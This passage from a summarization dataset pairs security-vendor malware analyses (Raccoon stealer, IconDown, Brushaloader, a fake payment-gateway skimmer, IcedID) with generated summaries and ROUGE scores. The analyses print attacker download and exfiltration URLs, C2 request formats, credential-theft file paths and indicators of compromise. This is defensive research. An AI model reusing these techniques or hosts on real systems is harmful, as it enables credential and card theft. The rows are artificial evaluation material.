we couldn't believe that he was capable of such baseness.""""We do not claim that @Alexuiop1337 and @overdot work directly with this person, but an attempt to hype this situation on behalf (of the aforementioned person)""Additionally, in June of 2019 raccoonstealer published an unusual post that revealed an internal feud with former team members. Allegedly, Participant 777 (777@raccoon.biz) stole $900 from the community balance and left the project.""Attention!We do not offer any services except the rental of our software! Participant 777 left the project, taking $900 from the shared common fund. There was scam attempt from the telegram account @enot_support.In the ""expe"" (a Russian slang for the infamous ""exploit[.]in"" underground hacking community), they blacklisted the aforementioned account.THE ONLY CONTACTS FOR CONTACTING US!Jabber: support@raccoon.biz randomuser@ucia.icu green@raccoon.biz Telegram: @ darkgr33n""These two incidents make it clear that Raccoon is developed by several individuals that work together, but are not necessarily a tight-knit team.Raccoon Stealer OverviewHow is Raccoon Delivered?Raccoon is delivered in multiple ways, though we see Raccoon delivered most often through exploit kits, phishing attacks, and through bundled malware.Delivery by Exploit KitExploit kits automatically exploit vulnerabilities on a victim's machine while they are browsing the web. In browsing the web, the user visits a malicious page that redirects to a landing page containing exploit code, often executed without the users consent or interaction.In order to deliver Raccoon, the attackers leverage the Fallout exploit kit to spawn a PowerShell instance from Internet Explorer and subsequently download the main payload of the infostealer.The Fallout exploit kit delivers Raccoon, as seen in the Cybereason platform.Delivery by PhishingPhishing is a social engineering attack where a user is tricked into executing malicious content. Most commonly, the user receives an email with an attached Office document. This document contains embedded malicious macro code that, when opened, executes.In order to deliver Raccoon, the attackers use an email with an attached Word document. Upon opening the Word document and enabling macros, the macro code creates a connection to a malicious domain and downloads the main payload of the infostealer.The malicious Word document downloading the Raccoon stealer payload, as seen in the Cybereason platform.Delivery by Bundled MalwareBundled malware is malware that is bundled with legitimate software downloaded from ""shady"" websites. The bundled malware is often hidden from the user during installation or makes use of social engineering techniques to enable installation.In order to deliver Raccoon, the attackers use legitimate software bundled with the main payload of the infostealer to infect unsuspecting users. Raccoon installs itself behind-the-scenes, hidden from the user.Exploring Raccoon's Code and Core FunctionalityThe internal path from malware compilation on the attackers machine.As mentioned above, the Raccoon team appears to be of Russian origin. A typo found in the internal path also suggests they are not native English speakers.The Raccoon team issuing a recommendation for a third-party crypter.The main payload of Raccoon is not packed and does not include built-in anti-debug or anti-VM protections. It is sold as-is without any protection from analysts or detection. However, the Raccoon team does recommend a third-party crypter call GreenCrypt to evade antivirus products and protect against detection and analysis.Raccoon's Communication with its C2 ServerOnce the loader executes on the target machine, it unpacks itself in memory and connects to its C2 server. Raccoon sends a POST request with Base64-encoded parameters bot_id and config_id.Raccoon sending a POST request with two parameters.Upon successful connection and verification of Raccoon's Bot ID, it downloads a compressed zip file with multiple different DLLs. These DLLs are not necessarily malicious on their own, but Raccoon depends on them to successfully collect and steal data on the target machine.Gathering Local Settings on the Target MachineThe Raccoon stealer code checks the target machine's local settings.However, the Raccoon stealer does check the target machine's local settings and compare it against a list of languages, including Russian, Ukrainian, Belarussian, Kazakh, Kyrgyz, Armenian, Tajik, and Uzbek. If the target machine's local settings match one of these languages, the malware immediately aborts. This is common practice by malware originating from CIS countries.Collecting Sensitive DataAfter initial infection, the Raccoon stealer uses several methods to collect sensitive information. It stores any sensitive information it finds in the Temp folder.Capturing Screenshots from Infected MachineThe Raccoon stealer code takes a screen capture of the target machine.Raccoon takes a screen capture of the target machine using GetDesktopWindow and CreateCompatibleBitmap, and stores it as screen.jpeg in the Temp folder.Stealing System InformationRaccoon collects system information from the infected machine, including username, IP address, language settings, OS version, information on installed apps, and CPU and memory information. The information is stored in a text file found in:C:\Users\[user]\AppData\Local\Temp\machineinfo.txtInformation collected by the Raccoon Stealer.Stealing Browser InformationA lot of saved browser data is stored within SQLite database files on a local machine. For example, when a user saves their username and password in the browser, the browser stores the data in a Login Data SQLite database file. The browser also stores cookie information in a cookies file, and other autofill data, like credit card data, in a Web Data file.Raccoon steals this information from over thirty different browser types. It searches the registry software hive for installed browsers and steals credentials, cookies, and autofill data from targeted browsers.Browsers Targeted by the Raccoon StealerChrome Amigo RockMelt Sputnik Chromium Orbitum 360Browser Kometa Xpom Bromium Vivaldi uCozMedia Comodo Nichrome Opera QIP Surf Epic Privacy Browser CocCoc Suhba Chedot CentBrowser Elements Browser Safer Technologies - Secure Browser Superbird 7Star TorBro Rafotech - Mustang Torch Firefox WaterFox SeaMonkey Pale Moon GO!Example of Raccoon's browser stealing configuration codeRaccoon copies targeted browser data files to the Temp folder with random names. It uses a DLL, SQLite3.dll, downloaded from its C2 server to parse the files and extract sensitive data. The stolen information is divided into several text files named after their associated browser and saved under Temp/browsers.Raccoon also creates one master file with the name passwords.txt that contains any and all passwords stolen from the victim's machine.Example of the format of passwords.txt, containing passwords stolen by Raccoon.Stealing Outlook AccountsRaccoon's code to extract information about Microsoft Outlook accounts.Raccoon extracts information about Microsoft Outlook accounts from registry keys on the target machine.HKEY_CURRENT_USER\Software\Microsoft\Office\Outlook\OMI Account Manager\AccountsHKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet SettingsHKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\OutlookIn addition, Raccoon searches the Windows Registry for sensitive information stored in Mail clients, such as usernames and passwords, then saves it to a text file under Temp/mails.Raccoon gathering information from Mail client accounts on the target machine.Stealing Cryptocurrency WalletsRaccoon searches for multiple cryptocurrency wallets on the machine, including:C:\Users\<user>\AppData\Roaming\Electrum\walletsC:\Users\<user>\AppData\Roaming\Jaxx\Local StorageC:\Users\<user>\AppData\Roaming\Exodus\exodus.walletC:\Users\<user>\AppData\Roaming\Ethereum WalletIf any cryptocurrency wallets are found, they are saved under Temp.For the convenience of the client, Raccoon has a service that automatically processes all cryptocurrency wallets without needing to search for specific logs among all the stolen data.New features to come?Current versions of Raccoon do not have keylogging functionality. Several users in the underground community are asking for this feature, and the Raccoon team has suggested it may be available in the future.Screenshot from the underground community of the Raccoon team considering adding support for keylogging.Data Exfiltration & Self DeletionRaccoon saves all stolen data to a zip file gate.zip and sends the information to its C2 server.All stolen data Raccoon has collected on the target machine.After it successfully exfiltrates all sensitive data, Raccoon deletes its binary from the victim's machine, as can be seen in the following screenshot of Raccoon's process spawning cmd.exe with ping.exe and executing the deletion command.The malicious process Raccoon creates to delete any trace on the machine.How is Raccoon Affecting Businesses and Individuals?Based on the logs for sale in the underground community, Raccoon is estimated to have infected over 100,000 endpoints worldwide within a few months. It is easy to operate for technical and nontechnical individuals alike, lending it mass appeal. Moreover, the team behind Raccoon is constantly working to improve it and provide responsive service. It gives individuals a quick-and-easy way to make money stealing sensitive data without investing a lot of funds or having a deep technical background.Raccoon collects a wide swath of information, including credit card information, cryptocurrency wallets, usernames and passwords, and browsing data, which is used to steal corporate data, money, and other sensitive information. This data is used against victims as blackmail or monetized by cybercriminals selling it in underground communities.Cybereason Vs. Raccoon?In addition to our anomalous behavior detection and investigation capabilities, Cybereason's NGAV technology can detect and prevent Raccoon infections.Screenshot from VirusTotal, Cybereason NGAV detects Raccoon's executable as malicious.Cybereason platform prevents the malicious executable.ConclusionThough the Raccoon stealer may not be the most innovative infostealer on the market, it is still gaining significant traction in the underground community. Based on testimonials from the underground community, The Raccoon team provides reliable customer service to give cybercriminals a quick-and-easy way to commit cybercrime without a huge personal investment.This has not come without strife. The team has faced several public disputes in underground forums, and has received some criticism from competitors. Despite this, Raccoon has quickly become one of the top ten mentioned malware in the underground community, despite being launched in early 2019. Overall, sentiment around Raccoon is positive, with some calling it the best replacement available for the now defunct Azorult infostealer.Raccoon's popularity combined with its limited feature set yet high adoption speaks to a growing trend of the commoditization of malware, as malware authors shoot to create platforms for crime instead of committing the crimes directly. As malware authors choose to develop MaaS, they must partake in many of the same activities as a legitimate SaaS business: marketing efforts, relying on positive reviews, responsive customer support, and regularly improving features in their product. We only expect this trend to continue into 2020 and push the evolution of MaaS forward.Endpoint protection is key to defending against techniques like these. Learn more during our webinar on Endpoint Protection Platforms.APPENDIXINDICATORS OF COMPROMISEReview the Indicators of Compromise for the Raccoon Stealer here.MITRE ATT&CK TECHNIQUES BREAKDOWN";Raccoon is a popular malware platform for cybercriminals. It has been praised for its consistent quality of service, support, and user experience. Many in the underground community praise and endorse Raccoon's malware capabilities and the services the team provides. Some voices in the community find Raccoon to be simple and lacking in features when compared to other information stealers. With that said, it largely makes up for it with consistency and an impressive level of service, support, and quality user experience.;en;{'r': 0.038088642659279776, 'p': 0.9482758620689655, 'f': 0.07323568500984927};{'r': 0.019488817891373803, 'p': 0.8133333333333334, 'f': 0.0380655221638382};{'r': 0.038088642659279776, 'p': 0.9482758620689655, 'f': 0.07323568500984927}
https://blogs.jpcert.or.jp/en/2019/11/icondown-downloader-used-by-blacktech.html;IconDown – Downloader Used by BlackTech - JPCERT/CC Eyes;"In the past articles, we have introduced TSCookie and PLEAD, the malware used by an attack group BlackTech. We have confirmed that this group also uses another type of malware called ""IconDown"". According to ESET's blog[1], it has been confirmed that the malware is distributed through the update function of ASUS WebStorage. This article describes the details of IconDown found in Japanese organisations.IconDown's behaviourThe malware downloads a file from a specific site. This is an example of the HTTP GET requests sent from IconDown.GET /logo.png HTTP/1.1 Host: update.panasocin.com Cache-Control: no-cacheThen, it searches for the following HEX values (as a signature of the embedded data) from the beginning of the downloaded file.91 00 13 87 33 00 90 06 19If the signature value is found, the following 256-byte data is parsed as a RC4 key. It is used to decrypt the data embedded in the downloaded file. (See Table 1 in Appendix A for details.)Figure 1: RC4 key and encrypted dataRC4-encrypted data is expected to contain configuration value and PE file. The following figure show the decrypted data.Figure 2: Example of decrypted dataIconDown creates a PE file from the decrypted data and save it to the filesystem. Based on the configuration value, it determines the path to save the file from the following:File name contained in the configuration of the downloaded file%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\slui.exe%TEMP%\F{random 8-digit hexadecimal string}.TMPThen, the saved PE file is executed as specified in the configuration value. (See Table 3 in Appendix B for details of the configuration.)In ClosingBlackTech has carried our attacks against Japanese organisations by using various types of malware. As the same activity is likely to continue, we will keep an eye on the situation. The hash values of the sample are listed in Appendix C, as well as a C&C server in Appendix D. Please make sure that none of your devices is communicating to the host.Shintaro Tanaka(Translated by Yukako Uchida)Reference[1]ESET: Plead malware distributed via MitM attacks at router level, misusing ASUS WebStoragehttps://www.welivesecurity.com/2019/05/14/plead-malware-mitm-asus-webstorage/Appendix A: Format of data downloaded by IconDownTable 1: Format of data downloaded by IconDown Offset Length Contents 0x000 9 91 00 13 87 33 00 90 06 19 (HEX value) 0x009 256 RC4 key 0x209 - RC4-encrypted data (See Table 2 for details.)Table 2: Format of the encrypted data Offset Length Contents 0x000 4 Fixed value (between 0 and 5, see Table 3 for details) 0x010 - File name (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\slui.exe if not configured) 0x114 - PE fileAppendix B: Method of creating/executing PE filesTable 3: Methods of creating/executing PE files Value Contents 0x00000000 Create a file named [File name in Table 2] 0x00000001 Create a file named [File name in Table 2] and execute cmd.exe /c [File name in Table 2] 0x00000002 Terminate itself 0x00000003 Create a file named [File name in Table 2] and terminate itself 0x00000004 Create a file named [File name in Table 2], execute cmd.exe /c [File name in Table 2] and terminate itself 0x00000005 Create a file named [File name in Table 2] and %TEMP%\F{random 8-digit hexadecimal string}, execute cmd.exe /c %TEMP%\F{random 8-digit hexadecimal string} and terminate itselfAppendix C: Hash value of the samplesIconDown634839b452e43f28561188a476af462c301b47bddd0468dd8c4f452ae80ea0af6bf301b26a919f86655e4ccb20237cc3b6b6888f258d96aac4d62df7980e51a52e789fc5aa1318d0286264d70b2ececa15664689efa4f47c485d84df55231ac4A sample file downloaded by IconDownf6494698448cdaf6ec0ed7b3555521e75fac5189fa3c89ba7b2ad492188005b4Appendix D: C&C server";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://cert.pl/en/posts/2019/11/brushaloader-gaining-new-layers-like-a-pro/;Brushaloader gaining new layers like a pro;Yo dawg, I heard you like droppers so I put a dropper in your dropperOn 2019-11-18 we received a report that some of Polish users have began receiving malspam imitating DHL:In this short article, we'll take a look at the xls document that has been used as a (1st stage) dropper distributing another well-known (2nd stage) dropper - brushaloader.Samples analysed:6a101103486e67f1d8839edd18da773bd9b665ab3df650c9882245d0ee712b8e - 25163275820.xls- 25163275820.xls 627294cf0495d2daf8d543aca74bf3cf684673c6a32b8ebf6649f882b362a11a - brushaloader printhpp.vbe- brushaloader f25bee3bfe185c6df0ce25cf738f1cc9c72a9ea7f33f6f7545e73d2f3d79b5f8 - brushaloader drop(isfb dll)While the embedded links did not lead to anything interesting, there was also an .xls file attached, let's try opening it up:Interesting...Poking around, we have noticed that some cells have text in them, but their contents were hidden using specific style and formatting, the font size was set to 2 and color was set to white.Let's fetch the macro contents to see what's going on under the hood: ? ~olevba 25163275820.xlsThe above code is a complete source-code of the macros embedded in the spreadsheet. Taking a closer look we can identify several interesting snippets:The print button does nothing, probably to encourage users to enable macros in the document.The payload script will run only on application with language set to Polish (id=1045).The program will fetch values from cells D5:D8, E5:E8 and J10 which match the fields with embedded data that we have observed earlier.The cells' contents are decrypted and concatenated using a custom algorithm. The result is a PowerShell script:Decompressing the deflate blob can be easily achieved using the following Python script:Running the script yields the following results:The resulting script is somewhat obfuscated using strings formatting, we can clean it up with another quick Python script:Which gives us another PowerShell script with a large base64 blob that contains the next layer:Decoding the base64 and cleaning up the binary again gives us a yet another PowerShell script:After some manual formatting we eneded up with the below script:In short, the script iterates over drive IDs and concatenates them creating a hex-encoded unique id.That id is then submitted to the c2, which responds with an xor-encrypted payload, that is the first stage vbs of a normal brushaloader campaign.It can be easilly fetched, decrypted and decoded using this nifty Python script with some help from our malware-analysis library - malduck:Brushaloader has been described exensively in the past by Proofpoint and Talos, nothing new here.Let's focus on the dropped binary instead, Brushaloader used to be used for distribution of Danabot botnet no. 3 in Poland, but some time ago we have observed a shift to ISFB v2.For this particular sample the config is as follows:The static config is used to download webinjects and redirects targeting Polish banking sites and email providers.If you're interested in receiving information about webinjects targeted at your domain, you might want to check out our injects sharing website: injects.cert.plThat's it, if you have any additional questions do not hestitate to reach out to us at @CERT_Polska_en or [email protected]Thanks to Kafeine from Proofpoint for the ISFB sample.;The ITSecurity report has been summarized as follows:Yo dawg, I heard you like droppers so I put a dropper in your dropperOn 20191118 we received a report that some of Polish users have began receiving malspam imitating DHL:In this short article, we'll take a look at the xls document that has been used as a (1st stage) dropper distributing another wellknown (2nd stage) dropper brushaloader.Samples analysed:6a101103486e67f1d8839edd18da773bd9b665ab3df650c9882245d0ee712b8e 25163275820.xls 25163275820.xls 627294cf0495d2daf8d543aca74bf3cf684673c6a32b8ebf6649f882b362a11a brushaloader printhpp.vbe brushaloader f25bee3bfe185c6df0ce25cf738f1cc9c72a9ea7f33f6f7545e73d2f3d79b5f8 brushaloader drop(isfb dll)While the embedded links did not lead to anything interesting, there was also an .xls file attached, let's try opening it up:Interesting...Poking around, we have noticed that some cells have text in them, but;en;{'r': 0.271523178807947, 'p': 0.9318181818181818, 'f': 0.42051281701827753};{'r': 0.1903765690376569, 'p': 0.8348623853211009, 'f': 0.3100511043011995};{'r': 0.271523178807947, 'p': 0.9318181818181818, 'f': 0.42051281701827753}
https://www.malwarebytes.com/blog/news/2019/11/web-skimmer-phishes-credit-card-data-via-rogue-payment-service-platform;Web skimmer phishes credit card data via rogue payment service platform;"Posted: November 21, 2019 byThreat actors combine phishing with a web skimmer to create a devious scheme designed to lift credit card data from unaware shoppers.Heading into the holiday shopping season, we have been tracking increased activity from a threat group registering domains for skimming and phishing campaigns. While most of the campaigns implemented a web skimmer in the typical fashion--grabbing and exfiltrating data from a merchant's checkout page to an attacker-controlled server--a new attack scheme has emerged that tricks users into believing they're using a payment service platform (PSP).PSPs are quite common and work by redirecting the user from a (potentially compromised) merchant site onto a secure page maintained by the payment processing company. This is not the first time a web skimmer has attempted to interfere with PSPs, but in this case, the attackers created a completely separate page that mimics a PSP.By blending phishing and skimming together, threat actors developed a devious scheme, as unaware shoppers will leak their credentials to the fraudsters without thinking twice.Standard skimmerOver the past few months, we've tracked a group that has been active with web skimmer and phishing templates. As web security firm Sucuri noted, most of the domains are registered via the medialand.regru@gmail[.]com email address.Many of their skimmers are loaded as a fake Google Analytics library called ga.js. One of several newly-registered domain names we came across had a skimmer that fit the same template, hosted at payment-mastercard[.]com/ga.js.Figure 1: Simple skimmer based on previous templateThis malicious ga.js file is injected into compromised online shops by inserting a one line piece of code containing the remote script in Base64 encoded form.Figure 2: A JavaScript library from a compromised shop injected with the skimmerHowever, one thing we noticed is that the payment-mastercard[.]com domain was also hosting a completely different kind of skimmer that at first resembled a phishing site.Phish-like skimmerThis skimmer is interesting because it looks like a phishing page copied from an official template for CommWeb, a payments acceptance service offered by Australia's Commonwealth Bank (https://migs.mastercard.com.au).Figure 3: Fraudulent and legitimate payment gateways shown side by sideAs the text reads ""Your details will be sent to and processed by The Commonwealth Bank of Australia and will not be disclosed to the merchant"" this is not a login page to phish credentials, but rather a pretend payment gateway service.The attackers have crafted it specifically for an Australian store running the PrestaShop Content Management System (CMS), exploiting the fact that it accepts payments via the Commonwealth Bank.Figure 4: Modes of payments accepted by the storeThe scheme consists of swapping the legitimate e-banking page with the fraudulent one in order to collect the victims' credit card details. We also noticed that the fake page did something we don't always see with standard skimmers in that it checked that all fields were valid and informed the user if they weren't.Figure 5: Fake payment gateway page shown with its JavaScript that exfiltrates the dataHere's how this works:The fraudulent page will collect the credit card data entered by the victim and exfiltrate it via the payment-mastercard[.]com/ga.php?analytic={based64} URLRight after, the victim is redirected to the real payment processor via the merchant's migs_vpc module (MIGs VPC is an integrated payment service)The legitimate payment site for Australia's Commonwealth Bank is loaded and displays the total amount due for the purchase.Figure 6: Web traffic showing data exfiltration process followed by redirect to legitimate PSPHere's the final (and legitimate) payment page displayed to the victim. Note how the total amount due from the purchase on the compromised shop is carried over. This is done by creating a unique session ID and reading browser cookies.Figure 7: Legitimate payment gateway page used for actual payment of goodsWeb skimming in all different formsWeb skimming is a profitable criminal enterprise that shows no sign of slowing down, sparking authorities' attention and action plans.Externalizing payments shifts the burden and risk to the payment company such that even if a merchant site were hacked, online shoppers would be redirected to a different site (i.e. Paypal, MasterCard, Visa gateways) where they could enter their payment details securely.Unfortunately, fraudsters are becoming incredibly creative in order to defeat those security defenses. By combining phishing-like techniques and inserting themselves in the middle, they can fool everyone.Malwarebytes users are already protected against this particular scheme as the fraudulent infrastructure was already known to us.Indicators of Compromisepayment-mastercard[.]comgoogle-query[.]comgoogle-analytics[.]topgoogle-smart[.]comgoogle-payment[.]comjquery-assets[.]comsagepay-live[.]comgoogle-query[.]compayment-sagepay[.]compayment-worldpay[.]com124.156.34[.]15747.245.55[.]1985.53.124[.]235";The ITSecurity report states that a new attack scheme has emerged that tricks users into believing they're using a payment service platform (PSP). By blending phishing and skimming together, threat actors developed a devious scheme, as unaware shoppers will leak their credentials to the fraudsters without thinking twice. Malwarebytes users are already protected against this particular scheme as the fraudulent infrastructure was already known to us.;en;{'r': 0.1288782816229117, 'p': 0.9473684210526315, 'f': 0.22689075419435423};{'r': 0.08039492242595205, 'p': 0.8769230769230769, 'f': 0.14728682016689035};{'r': 0.1288782816229117, 'p': 0.9473684210526315, 'f': 0.22689075419435423}
https://www.malwarebytes.com/blog/news/2019/12/new-version-of-icedid-trojan-uses-steganographic-payloads;New version of IcedID Trojan uses steganographic payloads;"Posted: December 3, 2019 byWe take a deep dive into the IcedID Trojan, describing the new payloads of this advanced malware.This blog post was authored by @hasherezade, with contributions from @siri_urz and Jerome Segura.Security firm Proofpoint recently published a report about a series of malspam campaigns they attribute to a threat actor called TA2101. Originally targeting German and Italian users with Cobalt Strike and Maze ransomware, the later wave of malicious emails were aimed at the US and pushing the IcedID Trojan.During our analysis of this spam campaign, we noticed changes in how the payload was implemented, in particular with some code rewritten and new obfuscation. For example, the IcedID Trojan is now being delivered via steganography, as the data is encrypted and encoded with the content of a valid PNG image. According to our research, those changes were introduced in September 2019 (while in August 2019 the old loader was still in use).The main IcedID module is stored without the typical PE header and is run by a dedicated loader that uses a custom headers structure. Our security analyst @hasherezade previously described this technique in a talk at the SAS conference (Funky Malware Formats).In this blog post, we take a closer look at these new payloads and describe their technical details.DistributionOur spam honeypot collected a large number of malicious emails containing the ""USPS Delivery Unsuccessful Attempt Notification"" subject line.Each of these emails contains a Microsoft Word document as attachment allegedly coming from the United States Postal Service. The content of the document is designed to lure the victim into enabling macros by insinuating that the content had been encoded.Having a look at the embedded macros, we can see the following elements:There is a fake error message displayed to the victim, but more importantly, the IcedID Trojan authors have hidden the malicious instructions within a UserForm as labels.The labels containing numerical ASCII valuesThe macro grabs the text from the labels, converts it, and uses during execution:url1 = Dcr(GH1.Label1.Caption)path1 = Dcr(GH1.Label2.Caption)For example:104 116 116 112 58 47 47 49 48 52 46 49 54 56 46 49 57 56 46 50 51 48 47 119 111 114 100 117 112 100 46 116 109 112converts to: http://104.168.198.230/wordupd.tmp67,58,92,87,105,110,100,111,119,115,92,84,101,109,112,92,101,114,101,100,46,116,109,112converts to: C:\Windows\Temp\ered.tmpThe file wordupd.tmp is an executable downloaded with the help of the URLDownloadToFileA function, saved to the given path and run. Moving on, we will take a closer look at the functionality and implementation of the downloaded sample.Behavioral analysisAs it had before, IcedID has been observed making an injection into svchost, and running under its cover. Depending on the configuration, it may or may not download other executables, including TrickBot.Dropped filesThe malware drops various files on the disk. For example, in %APPDATA%, it saves the steganographically obfuscated payload (photo.png) and an update of the downloader:It also creates a new folder with a random name, where it saves a downloaded configuration in encrypted form:Inside the %TEMP% folder, it drops some non-malicious helper elements: sqlite32.dll (that will be used for reading SQLite browser databases found in web browsers), and a certificate that will be used for intercepting traffic:Looking at the certificate, we can see that it was signed by VeriSign:PersistenceThe application achieves persistence with the help of a scheduled task:The task has two triggers: at the user login and at the scheduled hour.Overview of the trafficMost of the traffic is SSL encrypted. We can also see the use of websockets and addresses in a format such as ""data2php?<key>"", ""data3.php?<key>"".Attacking browsersThe IcedID Trojan is known as a banking Trojan, and indeed, one of its important features is the ability to steal data related to banking transactions. For this purpose, it injects its implants into browsers, hooks the API, and performs a Man-In-The-Browser attack.Inside the memory of the infected svchost process we can see the strings with the configuration for webinjects. Webinjects are modular (typically HTML and JavaScript code injected into a web page for the purpose of stealing data).Webinjects configuration in the memory of infected svchostThe core bot that runs inside the memory of svchost observes processes running on the system, and injects more implants into browsers. For example, looking at Mozilla Firefox:The IcedID implant in the browser's memoryBy scanning the process with PE-sieve, we can detect that some of the DLLs inside the browser have been hooked and their execution was redirected to the malicious module.In Firefox, the following hooks have been installed:nss3.dll : SSL_AuthCertificateHook->2c2202[2c1000+1202]ws2_32.dll : connect->2c2728[2c1000+1728]A different set was observed in Internet Explorer:mswsock : hook_0[7852]->525d0[implant_code+15d0]ws2_32.dll : connect->152728[implant_code+1728]The IcedID module running inside the browser's memory is responsible for applying the webinjects installing malicious JavaScripts into attacked pages.Fragment of the injected scriptThe content of the inlined webinject script is available here: inject.js.It also communicates with the main bot that is inside the svchost process. The main bot coordinates the work of all the injected components, and sends the stolen data to the Command and Control server (CnC).Due to the fact that the communication is protected by HTTPS, the malware must also install its own certificate. For example, this is the valid certificate for the Bank of America website:And in contrast, the certificate used by the browser infected by IcedID:Overview of the changesAs we mentioned, the core IcedID bot, as well as the dedicated loader, went through some refactoring. In this comparative analysis, we used the following old sample: b8113a604e6c190bbd8b687fd2ba7386d4d98234f5138a71bcf15f0a3c812e91The detailed analysis of this payload can be found here: [1][2][3].The old loader vs. newThe loader of the previous version of the IcedID Trojan was described in detail here, and here. It was a packed PE file that used to load and inject a headerless PE.The main module was injected into svchost:The implants in the svchost's memoryThe implanted PE was divided into two sections, and the first memory page (representing the header) was empty. This type of payload is more stealthy than a full PE injection (as is more common). However, it was possible to reconstruct the header and analyze the sample like a normal PE. (An example of the reconstructed payload is available here: 395d2d250b296fe3c7c5b681e5bb05548402a7eb914f9f7fcdccb741ad8ddfea).The redirection to the implant was implemented by hooking the RtlExitUserProcess function within svchost's NTDLL.When svchost tried to terminate, it instead triggered a jump into the injected PE's entry point.The hooked RtlExitUserProcess redirects to payload's EPThe loader was also filling the pointer to the data page within the payload. We can see this pointer being loaded at the beginning of the payload's execution:In the new implementation, there is one more intermediate loader element implemented as shellcode. The diagram below shows the new loading chain:The shellcode has similar functionality that was previously implemented by the loader in form of a PE. First it injects itself into svchost.Then it decompresses and injects the payload, which as before is a headerless PE (analogical to the one described here).Comparing the coreThe implementation of the core bot is modified. Yet, inside the code we can find some strings known from the previous sample, as well as a similar set of imported API functions. We can also see some matching strings and fragments of implemented logic.Fragment of the code from the old implementationAnalogical fragment from the new sample:Fragment of the code from the new implementationComparing both reconstructed samples with the help of BinDiff shows that there are quite a few differences and rewritten parts. Yet, there are parts of code that are the same in both, which proves that the codebase remained the same.Preview of the similar functionsPreview of different/rewritten functionsLet's follow the execution flow of all the elements from the new IcedID package.The downloaderIn the current delivery model, the first element of IcedID is a downloader. It is a PE file, packed by a crypter. The packing layer changes from sample to sample, so we will omit its description. After unpacking it, we get the plain version: fbacdb66748e6ccb971a0a9611b065ac.Internally, this executable is simple and no further obfuscated. We can see that it first queries the CnC trying to fetch the second stage, requesting for a photo.png. It passes a generated ID to the URL. Example:/photo.png?id=0198d464fe3e7f09ab0005000000fa00000000Fragment of the function responsible for generating the image URLThe downloader fetches the PNG with the encoded payload. Then it loads the file, decodes it, and redirects the execution there. Below we can see the responsible function:Once the PNG is downloaded, it will be saved on disk and can be loaded again at system restart. The downloader will turn into a runner of this obfuscated format. In this way, the core executable is revealed only in memory and never stored on disk as an EXE file.The ""photo.png"" looks like a valid graphic file:Preview of the ""photo.png""In this fragment of code, we can see that the data from the PNG (section starting from the tag ""IDAT"") is first decoded to raw bytes, and then those bytes are passed to the further decoding function.The algorithm used for decoding the bytes:The PNG is decrypted and injected into the downloader. In this case, the decoded content turns out to be a shellcode module rather than a PE.The downloader redirecting the execution into the shellcode's entry pointThe loader passes to the shellcode one argument, that is the base at which it was loaded.The loader (shellcode)As mentioned before, this stage is implemented as a position-independent code (shellcode). The dumped sample is available here: 624afab07528375d8146653857fbf90d.This shellcode-based loader replaced the previously described (sources: [1][2]) loader element that was implemented as a PE file. First, it runs within the downloader:As we can see from the downloader's code, the shellcode entry point must first be fetched from a simple header that is at the beginning of the decoded module. We see that this header stores more information that is essential for loading the next element:As this module is no longer a PE file, its analysis is more difficult. All the APIs used by the shellcode are resolved dynamically:The strings are composed on the stack:To make the deobfuscation easier, we can follow the obfuscated flow with the help of a PIN tracer. The log from the tracing of this stage (on a 32 bit system) shows APIs indicating code injection, along with their offsets:09c,shellcode's Entry Point69b,ntdll.LdrLoadDll717,ntdll.LdrGetProcedureAddress7ab,ntdll.RtlWow64EnableFsRedirectionEx7cb,kernel32.CreateProcessA7d6,ntdll.RtlWow64EnableFsRedirectionEx7f0,ntdll.NtQuerySystemInformation8aa,ntdll.NtAllocateVirtualMemory8c6,ntdll.ZwWriteVirtualMemory8ee,ntdll.NtProtectVirtualMemory907,ntdll.NtQueueApcThread916,ntdll.ZwResumeThreadIndeed, the shellcode injects its own copy, passing its entry point to the APC Queue. This time, some additional parameters are added as a thread context.Setting parameters of the injected threadOnce the shellcode is executed from inside svchost, an alternative path to the execution is taken. It becomes a loader for the core bot. The core element is stored in a compressed form within the shellcode's body. First, it is decompressed.From previous experiments, we know that the payload follows the typical structure of a PE file, yet it has no headers. Often, malware authors erase headers in memory once the payload is loaded. Yet, this is not the case. In order to make the payload stealthier, the authors didn't store the original headers of this PE at all. Instead, they created their own minimalist header that is used by the internal loader.First, the shellcode finds the next module by parsing its own header:The shellcode also loads the imports of the payload:Below, we can see the fragment of code responsible for following the custom headers definition, and applying protection on pages. After the next element is loaded, execution is redirected to its entry point.The entry point of the next module where the function expects the pointer to the data to be supplied:The supplied data is appended at the end of the shellcode, and contains: the path of the initial executable, the path of the downloaded payload (photo.png), and other data.Note that described analysis was performed on a 32 bit system. In case of a 64bit system, the shellcode takes an alternative execution path, and a 64bit version of the payload is loaded with the help of Heaven's Gate technique. Yet, all the features of both payload's versions are identical.The Heaven's Gate within the shellcode: switch to 64 bit modeReconstructing the PEIn order to make analysis easier, it is always beneficial to reconstruct the valid PE header. There are two approaches to this problem:Manually finding and filling all the PE artifacts, such as: sections, imports, relocations (this becomes a problem in if all those elements are customized by the authors, as in the case of Ocean Lotus sample) Analyzing in detail the loader and reconstructing the PE from the custom headerSince we have access to the loader's code, we can go for the second, more reliable approach: Observe how the loader processes the data and reconstruct the meaning of the fields.A fragment of the loader's code where the sections are processed:The custom header reconstructed based on the analysis:Fortunately, in this case the malware authors customized only the PE header. The Data Directory elements (imports and relocations) are kept in a standard form, so this part does not need to be converted.The converter from this format to PE is available here:https://github.com/hasherezade/funky_malware_formats/tree/master/iced_id_parserInterestingly, the old version of IcedID used a similar custom format, but with one modification. In the past, there was one more DWORD-sized field before the ImportDirector VA. So, the latest header is shorter by one DWORD than the previous one.The module in the old format: bbd6b94deabb9ac4775befc3dc6b516656615c9295e71b39610cb83c4b005354The core bot (headerless PE)6aeb27d50512dbad7e529ffedb0ac153 - a reconstructed PELooking inside the strings of this module, we can guess that this element is responsible for all the core malicious operations performed by this malware. It communicates with the CnC server, reads the sqlite databases in order to steal cookies, installs its own certificate for Man-In-The-Browser attacks, and eventually downloads other modules.We can see that this is the element that was responsible for generating the observed requests to the CnC:During the run, the malware is under constant supervision from the CnC. The communication with the server is encrypted.String obfuscationThe majority of the strings used by the malware are obfuscated and decoded before use. The algorithm used for decoding 